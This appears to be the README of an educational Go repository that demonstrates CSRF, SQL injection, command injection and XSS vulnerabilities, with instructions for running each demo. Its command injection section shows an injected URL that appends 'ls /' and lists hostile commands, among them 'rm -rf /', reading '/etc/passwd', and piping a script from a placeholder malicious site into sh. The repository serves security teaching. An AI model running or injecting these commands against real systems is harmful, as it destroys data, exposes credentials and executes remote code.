# Web Security Standards Demo

## Introduction

This repository serves as an educational resource for understanding and addressing common web security vulnerabilities. It currently covers the following vulnerabilities through practical demonstrations, with actionable steps to mitigate them:

- Cross-Site Request Forgery (CSRF)
- SQL Injection
- Command Injection
- Cross-Site Scripting (XSS)

By studying these examples, developers can cultivate a security-first mindset, essential for building robust, production-grade web applications. This repo will be continuously updated with additional web security vulnerabilities and practices to further enhance secure development techniques.

## Project Structure (Go Workspace)

This repository now uses Go workspaces for better organization:

```
web-security/
├── go.work                 # Go workspace file
├── csrf/                  # CSRF protection demo
│   ├── go.mod
│   ├── main.go
│   └── templates/
├── xss/                   # XSS vulnerability demo
│   ├── go.mod
│   ├── main.go
│   └── templates/
├── sqli/                  # SQL injection demo
│   ├── go.mod
│   └── main.go
├── cmd-injection/         # Command injection demo
│   ├── go.mod
│   └── main.go
└── cmd/                   # Legacy structure
```

## How to Run Each Demo

### Using Makefile (Recommended)

```bash
# Show all available commands
make help

# Run specific demos
make csrf           # CSRF protection demo
make xss            # XSS vulnerability demo
make sqli           # SQL injection demo
make cmd-injection  # Command injection demo

# Sync workspace dependencies
make sync

# Test all modules build correctly
make test
```

### Manual Method

#### CSRF Protection Demo

```bash
cd csrf
go run main.go
```

Visit http://localhost:8080 to see CSRF protection in action using Gin framework.

#### XSS Vulnerability Demo

```bash
cd xss
go run main.go
```

Visit http://localhost:8080 to see XSS vulnerability demonstration.

#### SQL Injection Demo

```bash
cd sqli
go run main.go
```

Test with: http://localhost:8080/login?username=admin&password=password123

#### Command Injection Demo

```bash
cd cmd-injection
go run main.go
```

Test with: http://localhost:8080/gitlog?branch=main

## Go Workspace Benefits

Using `go.work` provides several advantages:

1. **Unified dependency management**: All modules share the same dependency cache
2. **Cross-module development**: Easy to work on multiple related modules
3. **Simplified building**: Build all modules with `go work sync`
4. **Better IDE support**: IDEs understand the workspace structure

## Workspace Commands

```bash
# Sync all modules in the workspace
go work sync

# Add a new module to workspace
go work use ./new-demo
```

### Command Injection

Command injection is a security vulnerability that occurs when an application passes unsafe user-supplied data to a system shell or command interpreter. Attackers can exploit this flaw to execute arbitrary commands on the host operating system, potentially compromising the entire system.

#### Running the Demo

To start the server, run:

```bash
go run cmd/commandinjection/main.go
```

#### Example Attack

Access the following URL to simulate a command injection attack:

```
http://localhost:8080/gitlog?branch=main%3Bls%20%2F
```

This URL injects an additional `ls /` command after the intended `main` branch, demonstrating how unsanitized input can lead to arbitrary command execution.

#### Potential Malicious Commands

Attackers may attempt to run various harmful commands, such as:

- `rm -rf /` — Deletes all files on the server.
- `cat /etc/passwd` — Reads sensitive system files.
- `whoami` — Reveals the user context the server is running under.
- `curl http://malicious-site.com/malware.sh | sh` — Downloads and executes malicious scripts.
- `ps aux` — Lists running processes, potentially exposing sensitive information.

#### Mitigation Strategies

- **Never** pass user input directly to system commands.
- Validate and sanitize all user inputs.
- Apply the principle of least privilege to the application process.
